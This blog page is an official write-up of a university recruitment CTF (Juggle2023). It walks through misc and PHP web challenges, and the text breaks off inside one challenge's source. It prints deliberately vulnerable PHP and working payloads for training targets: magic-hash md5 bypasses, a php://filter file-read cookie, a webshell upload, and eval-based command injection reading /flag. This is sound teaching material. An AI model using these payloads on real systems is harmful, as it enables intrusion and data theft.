
    <!DOCTYPE html>
    <html lang="en"
            
          
    >
    <head>
    <meta charset="utf-8">
    

    

    
    <title>
        Juggle2023_官方wp |
        
        diki の 个人blog</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CUbuntu%20Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
    
<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/v4-font-face.min.css">

    
<link rel="stylesheet" href="/css/loader.css">

    <meta name="description" content="Juggle2023_CTF-Game 官方writeup 声明:本次校赛赛题均采用国内各大CTF赛事的公开赛题，且不用于任何商业用途和盈利，仅用于本校招新，学习交流使用。  Misc第一周easyhash - write up1考点：md5  在cmd5查询密文得 q1w2e3r4t5y6u7 双击获取flag - write up1考点：进制工具使用  用16进制编辑器打开获得flag 123">
<meta property="og:type" content="article">
<meta property="og:title" content="Juggle2023_官方wp">
<meta property="og:url" content="https://dik1o.github.io/2024/01/07/Juggle2023-%E5%AE%98%E6%96%B9wp/index.html">
<meta property="og:site_name" content="diki の 个人blog">
<meta property="og:description" content="Juggle2023_CTF-Game 官方writeup 声明:本次校赛赛题均采用国内各大CTF赛事的公开赛题，且不用于任何商业用途和盈利，仅用于本校招新，学习交流使用。  Misc第一周easyhash - write up1考点：md5  在cmd5查询密文得 q1w2e3r4t5y6u7 双击获取flag - write up1考点：进制工具使用  用16进制编辑器打开获得flag 123">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img1-1704368490117-1.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img2.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img3.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img4.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img5.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img6.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img7.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img8.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img9.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img10.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img11.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img12.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img13.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img14.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img15.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/rrr.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img16.png">
<meta property="og:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img17.png">
<meta property="article:published_time" content="2024-01-06T22:46:52.000Z">
<meta property="article:modified_time" content="2024-01-08T23:35:59.417Z">
<meta property="article:author" content="diki">
<meta property="article:tag" content="web">
<meta property="article:tag" content="php">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://dik1o.github.io/Juggle2023-%E5%AE%98%E6%96%B9wp/img/img1-1704368490117-1.png">
    
        <link rel="alternate" href="/atom.xml" title="diki の 个人blog" type="application/atom+xml">
    
    
        <link rel="shortcut icon" href="/images/favicon.ico">
    
    
        
<link rel="stylesheet" href="https://unpkg.com/typeface-source-code-pro@1.1.13/index.css">

    
    
<link rel="stylesheet" href="/css/style.css">

    
        
<link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">

    
    
        
<link rel="stylesheet" href="https://unpkg.com/katex@0.16.7/dist/katex.min.css">

    
    
    
    
<script src="https://unpkg.com/pace-js@1.2.4/pace.min.js"></script>

    
        
<link rel="stylesheet" href="https://unpkg.com/wowjs@1.1.3/css/libs/animate.css">

        
<script src="https://unpkg.com/wowjs@1.1.3/dist/wow.min.js"></script>

        <script>
          new WOW({
            offset: 0,
            mobile: true,
            live: false
          }).init();
        </script>
    
<meta name="generator" content="Hexo 6.3.0"></head>

    <body>
    
<div id='loader'>
  <div class="loading-left-bg"></div>
  <div class="loading-right-bg"></div>
  <div class="spinner-box">
    <div class="loading-taichi">
      <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
      <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
      <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
      <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
    </svg>
    </div>
    <div class="loading-word">少女祈祷中...</div>
  </div>
</div>
</div>

<script>
  const endLoading = function() {
    document.body.style.overflow = 'auto';
    document.getElementById('loader').classList.add("loading");
  }
  window.addEventListener('load', endLoading);
  document.getElementById('loader').addEventListener('click', endLoading);
</script>


    <div id="container">
        <div id="wrap">
            <header id="header">
    
        <img data-src="/images/banner.jpg" data-sizes="auto" alt="Juggle2023_官方wp" class="lazyload">
    
    <div id="header-outer" class="outer">
        <div id="header-title" class="inner">
            <div id="logo-wrap">
                
                    
                    
                        <a href="/" id="logo"><h1>Juggle2023_官方wp</h1></a>
                    
                
            </div>
            
                
                
            
        </div>
        <div id="header-inner">
            <nav id="main-nav">
                <a id="main-nav-toggle" class="nav-icon"></a>
                
                    <span class="main-nav-link-wrap">
                        <span class="main-nav-icon"></span>
                        <a class="main-nav-link" href="/">Home</a>
                    </span>
                
                    <span class="main-nav-link-wrap">
                        <span class="main-nav-icon"></span>
                        <a class="main-nav-link" href="/archives">Archives</a>
                    </span>
                
                    <span class="main-nav-link-wrap">
                        <span class="main-nav-icon"></span>
                        <a class="main-nav-link" href="/about">About</a>
                    </span>
                
                    <span class="main-nav-link-wrap">
                        <span class="main-nav-icon"></span>
                        <a class="main-nav-link" href="/friend">Friend</a>
                    </span>
                
            </nav>
            <nav id="sub-nav">
                
                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml"
                       title="RSS Feed"></a>
                
                
                    <a id="nav-search-btn" class="nav-icon popup-trigger" title="Search">
                    </a>
                
            </nav>
            <div id="search-form-wrap">
                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dik1o.github.io"></form>
            </div>
        </div>
    </div>
</header>

            <div id="content" class="outer">
                <section id="main"><article id="post-Juggle2023-官方wp" class="h-entry article article-type-post"
         itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
    <div class="article-inner">
        <div class="article-meta">
            <div class="article-date wow slideInLeft">
    <a href="/2024/01/07/Juggle2023-%E5%AE%98%E6%96%B9wp/" class="article-date-link">
        <time datetime="2024-01-06T22:46:52.000Z"
              itemprop="datePublished">2024-01-07</time>
    </a>
</div>

            

        </div>
        <div class="hr-line"></div>
        

        <div class="e-content article-entry" itemprop="articleBody">
            
                <h1 id="Juggle2023-CTF-Game-官方writeup"><a href="#Juggle2023-CTF-Game-官方writeup" class="headerlink" title="Juggle2023_CTF-Game 官方writeup"></a>Juggle2023_CTF-Game 官方writeup</h1><blockquote>
<p>声明:本次校赛赛题均采用国内各大CTF赛事的公开赛题，且不用于任何商业用途和盈利，仅用于本校招新，学习交流使用。</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="第一周"><a href="#第一周" class="headerlink" title="第一周"></a>第一周</h4><h5 id="easyhash-write-up"><a href="#easyhash-write-up" class="headerlink" title="easyhash - write up"></a>easyhash - write up</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：md5</span><br></pre></td></tr></table></figure>

<p>在<a href="https%EF%BC%9A//cmd5.com/">cmd5</a>查询密文得 <code>q1w2e3r4t5y6u7</code></p>
<h5 id="双击获取flag-write-up"><a href="#双击获取flag-write-up" class="headerlink" title="双击获取flag - write up"></a>双击获取flag - write up</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：进制工具使用</span><br></pre></td></tr></table></figure>

<p>用16进制编辑器打开获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000h  FF FE 0D 0A 40 65 63 68 6F 20 6F 66 66 0D 0A 65  ÿþ..@echo off..e </span><br><span class="line">0010h  63 68 6F 20 66 6C 61 67 7B 31 37 32 63 62 37 66  cho flag&#123;172cb7f </span><br><span class="line">0020h  35 2D 37 34 64 62 2D 34 35 61 66 2D 61 31 31 38  5-74db-45af-a118 </span><br><span class="line">0030h  2D 39 38 64 31 66 38 35 37 32 62 33 66 7D 0D 0A  -98d1f8572b3f&#125;.. </span><br><span class="line">0040h  63 6C 73 0D 0A 65 63 68 6F 20 77 68 65 72 65 20  cls..echo where  </span><br><span class="line">0050h  69 73 20 74 68 65 20 66 6C 61 67 3F 0D 0A 70 61  is the flag?..pa </span><br><span class="line">0060h  75 73 65                                         use</span><br></pre></td></tr></table></figure>



<h4 id="第二周"><a href="#第二周" class="headerlink" title="第二周"></a>第二周</h4><h5 id="onion-write-up"><a href="#onion-write-up" class="headerlink" title="onion - write up"></a>onion - write up</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：zip爆破 py爬虫</span><br></pre></td></tr></table></figure>

<p>文件中包含一个加密压缩包和一个表格 显然pwd.csv为密码表<br>编写python代码 获得flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">pwd = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;pwd.csv&#x27;</span> <span class="string">&#x27;r&#x27;</span>).readlines()：</span><br><span class="line">	[k v] = i[：-<span class="number">1</span>].split(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	pwd[<span class="built_in">int</span>(k)] = v.encode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span> <span class="number">0</span> -<span class="number">1</span>)：</span><br><span class="line">	fn = <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>.zip&#x27;</span></span><br><span class="line">	<span class="keyword">with</span> zipfile.ZipFile(fn <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf：</span><br><span class="line">		zf.extractall(<span class="string">&#x27;.&#x27;</span> pwd=pwd[i])</span><br><span class="line">		zf.close()</span><br><span class="line">		os.remove(fn)</span><br></pre></td></tr></table></figure>



<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="第一周-1"><a href="#第一周-1" class="headerlink" title="第一周"></a>第一周</h4><h5 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：机器人协议，查看源代码方式，js前端禁用</span><br></pre></td></tr></table></figure>

<p>打开题目，我们首先发现，然后右键和F12被禁用了</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img1-1704368490117-1.png" alt="1"></p>
<p>但<code>ctrl+u</code>和<code>view-source</code>还可以使用，查看源码可以发现有<code>机器人协议</code> ( 0.0下面是想弄的彩蛋因为时间太急了就没填上坑..</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img2.png" alt="2"></p>
<p>百度一下机器人协议可以发现是在url后面添加robots.txt字样</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img3.png" alt="3"></p>
<p>得到一个一串字符串并且能被4整除 猜测是base64<code>cHJvbG9ndWUucGhw</code>，放到<a target="_blank" rel="noopener" href="https://cyberchef.org/">CyberChef</a> 这个网站自动解码。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img4.png" alt="4"></p>
<p>发现解出来这个php文件，直接访问响应的网址并再次查看源码，发现flag。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img5.png" alt="5"></p>
<h5 id="http"><a href="#http" class="headerlink" title="http"></a>http</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：考察传参方式，XFF伪造，浏览器UA头伪造和修改cookie(这里补充下知识点别的什么http之类的都是可以伪造的用bp的话首字母要大写伪造代理是via)</span><br></pre></td></tr></table></figure>

<p>参考平台里的通知，可以用burpsuite构造，也可以用hackerbar等工具。<br><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img6.png" alt="6">)</p>
<p>我这里使用的是<code>hackerbar</code>，大家也可以使用burp尝试一下，巩固下。如图，把参数都设置好后点击<code>execute</code>执行</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img7.png" alt="7"></p>
<p>执行后，如图。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img8.png" alt="8"></p>
<h5 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点： php特性 伪协议 题外话：emm 没出好 导致一开始flag.php能直接看到flag (但我觉得哪怕能看到也要自己一步一步思考做下...当然了 别的一些有奖励的比赛能偷鸡还是鼓励的 校赛新生赛之类锻炼自己的 不建议哈</span><br></pre></td></tr></table></figure>



<p>源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">    <span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="variable">$xiao</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> != <span class="number">1024</span> &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$c</span>) == <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable">$xiao</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Good job!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;然后呢?怎么做?怎么做??&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;你如果做到这了我想你应该会传参吧?!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>看题有三个判断，第一个if判断我们是否设置了<code>a、b、c、name</code>参数 (如何传参请看<a href="#http">上文http</a>)，第二个if判断 如果<code>a</code>不等于<code>b</code> 并且 <code>a</code>与<code>b</code>的<code>md5</code>值相等，这个很好绕，百度搜一下ctf md5相关字样就可以找得到，这里附一下常见的：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">240610708 ： 0e462097431906509019562988736854</span><br><span class="line">QLTHNDT ： 0e405967825401955372549139051580</span><br><span class="line">QNKCDZO ： 0e830400451993494058024219903391</span><br><span class="line">PJNPDWY ： 0e291529052894702774557631701704</span><br><span class="line">NWWKITQ ： 0e763082070976038347657360817689</span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>第三个判断，判断c不能是数字和数字字符串 并且不能等于1024 并且由于<code>intval()</code>函数还要检验它是1024，并且都是弱比较。</p>
<p>首先c是1024开头的了，因为<code>intval()</code>函数就先检测了，然后是<code>is_numeric()</code>这个函数，具体作用可以百度<code>php is_numeric()</code>，我们知道了  如果c是数字和数字字符串则返回 TRUE，否则返回 FALSE，在php中，如果数字和字符串相加，经过类型转换后再执行加法操作，如果不能转换则会将字符串视为0。 并且<code>e</code>这个字母在php中非常特殊，代表科学计数法，那c就很容易得出了，我们传入<code>c=1024e1.1</code> ，由于c的值是浮点数，则绕过了<code>!is_numeric()</code>，并且绕过了<code>!=1024</code>，又因为<code>intval()</code>函数转换后1024e1.1为整数1024，与1024相等，则该条件也成立。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img9.png" alt="9"></p>
<p>接下来就是name的值了，这里有个小细节，就是题里已经拼接了php所以不用自己加了，然后涉及到php伪协议，建议可以自行先百度看看伪协议相关知识，其中的过滤器非常有用。</p>
<p>这里直接传cookie：name&#x3D;php：&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag，然后去<a href="https%EF%BC%9A//cyberchef.org/">CyberChef</a>或者别的base64网站解压即得flag。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img10.png" alt="10"></p>
<h4 id="第二周-1"><a href="#第二周-1" class="headerlink" title="第二周"></a>第二周</h4><h5 id="php作业管理系统"><a href="#php作业管理系统" class="headerlink" title="php作业管理系统"></a>php作业管理系统</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：php一句话木马</span><br></pre></td></tr></table></figure>

<p>首先要登录系统，F12可以看到账户和密码都是admin。</p>
<p>登录后发现可以上传文件和创建文件，那么应该就是rce了。</p>
<p>随便写一个php一句话木马或者上传都可以，不会的也可以百度php一句话木马（web就是万物都可百度。。。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img11.png" alt="11"></p>
<p>这里为了方便我就创建文件了。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img12.png" alt="12"></p>
<p>创建完后编辑文件即可。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img13.png" alt="13"></p>
<p>然后直接访问ip&#x2F;shell.php，或者连<code>中国蚁剑、菜刀</code>之类的工具也都可以。</p>
<p><img src="/./Juggle2023-%E5%AE%98%E6%96%B9wp/img/img14.png" alt="14"></p>
<h5 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h5><p>你们的第一次<code>getshsell</code>！让你第一回当黑客！爽到了没！！ 但是还是要在这给你提一嘴，道路千万条，安全第一条，网络从来不是非法之地，请熟知网络安全法！！！</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：php特性rce php对非法参数名</span><br></pre></td></tr></table></figure>



<p>在php8.x版本之前，php会对第一次遇到的错误参数进行替换，把非法参数替换为下划线_，后续如果在遇到非法字符则不会再进行替换，所以我们只要把第一次传入的参数替换为非法字符，php则会自动转换为下划线_，也就是cookie传入<code>Juggle[ctf2023招新.QQ群：</code>即可。</p>
<p>接下来就是套娃了，payload：</p>
<p>第一层<code>cookie</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie： Juggle[ctf2023招新.QQ群：=a</span><br></pre></td></tr></table></figure>

<p>第二层<code>get</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=b</span><br></pre></td></tr></table></figure>

<p>第三层<code>post</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b=c&amp;c[9][2][4][5][7][3][4][5][0]=phpinfo();</span><br></pre></td></tr></table></figure>



<p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_POST</span>[<span class="variable">$_GET</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;Juggle_ctf2023招新.QQ群：&#x27;</span>]]]][<span class="number">9</span>][<span class="number">2</span>][<span class="number">4</span>][<span class="number">5</span>][<span class="number">7</span>][<span class="number">3</span>][<span class="number">4</span>][<span class="number">5</span>][<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="第三周"><a href="#第三周" class="headerlink" title="第三周"></a>第三周</h4><h5 id="真亦假假亦真"><a href="#真亦假假亦真" class="headerlink" title="真亦假假亦真"></a>真亦假假亦真</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：php代码审计 代码逻辑 rce</span><br></pre></td></tr></table></figure>



<p>题目：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">某一天假如给你一次机会让你来自定义if中的条件你会做点什么?提交后访问check.php查看结果</span><br><span class="line"></span><br><span class="line">提交方式$_POST[&quot;check&quot;]</span><br><span class="line"></span><br><span class="line">记得访问一下check.php哦~</span><br><span class="line"></span><br><span class="line">check.php的内容</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $a=false;</span><br><span class="line">    $b=false;</span><br><span class="line">    if(你提交的部分将会被写至这里)</span><br><span class="line">    &#123;$a=true;&#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;$b=true;&#125;</span><br><span class="line">    if($a===true&amp;&amp;$b===true)</span><br><span class="line">    eval(system(cat /flag));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>有点类似<code>create_function</code>的特性rce，有比较多的(马叉虫)姿势，欢迎同学们多开发脑洞自己本地尝试~~</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post：check=1)&#123;system(&#x27;tac /fl444ag&#x27;);&#125;/*</span><br></pre></td></tr></table></figure>



<h5 id="happyPOP"><a href="#happyPOP" class="headerlink" title="happyPOP"></a>happyPOP</h5><p>这题是想讲一下基础的反序列化既然你们学长学姐做出来了过后不会的就去烦他们让他们复盘教你们吧!</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">考点：php特性rce md5绕过 php反序列化 eval和assert区别</span><br></pre></td></tr></table></figure>



<p>题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// Try build belong to your first POP chain!</span></span><br><span class="line"><span class="comment">// flag in /flag</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">timo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">gets</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;nonono&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crz</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$impo</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span 